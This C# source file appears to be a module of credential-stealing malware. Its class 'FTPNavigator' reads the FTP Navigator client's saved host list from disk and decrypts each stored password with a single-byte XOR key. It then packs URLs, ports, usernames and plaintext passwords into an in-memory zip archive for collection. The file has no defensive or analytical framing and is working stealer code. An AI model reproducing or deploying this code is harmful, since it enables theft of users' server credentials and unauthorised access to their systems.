using Helper.Data;
using Helper.Encrypted;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Targets.Applications
{
	public class FTPNavigator : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string path = "C:\\FTP Navigator\\Ftplist.txt";
	    if (!File.Exists(path))
	      return;
	    string[] strArray1 = File.ReadAllLines(path);
	    List<string> values = new List<string>();
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
	    {
	      Name = "FTP Navigator"
	    };
	    foreach (string str1 in strArray1)
	    {
	      if (!string.IsNullOrWhiteSpace(str1))
	      {
	        string[] strArray2 = str1.Split(';');
	        string str2 = strArray2[1].Split('=')[1];
	        string str3 = strArray2[2].Split('=')[1];
	        string input = strArray2[3].Split('=')[1];
	        string str4 = strArray2[4].Split('=')[1];
	        if (!(strArray2[5].Split('=')[1] != "0"))
	        {
	          string str5 = Xor.DecryptString(input, (byte) 25);
	          values.Add($"Url: {str2}:{(string.IsNullOrEmpty(str3) ? "21" : str3)}\nUsername: {str4}\nPassword: {str5}\n");
	          counterApplications.Files.Add(path + " => FTP Navigator\\Hosts.txt");
	        }
	      }
	    }
	    if (values.Count <= 0)
	      return;
	    string entryPath = "FTP Navigator\\Hosts.txt";
	    zip.AddFile(entryPath, Encoding.UTF8.GetBytes(string.Join("\n", (IEnumerable<string>) values)));
	    counterApplications.Files.Add(entryPath);
	    counter.Applications.Add(counterApplications);
	  }
	}
}
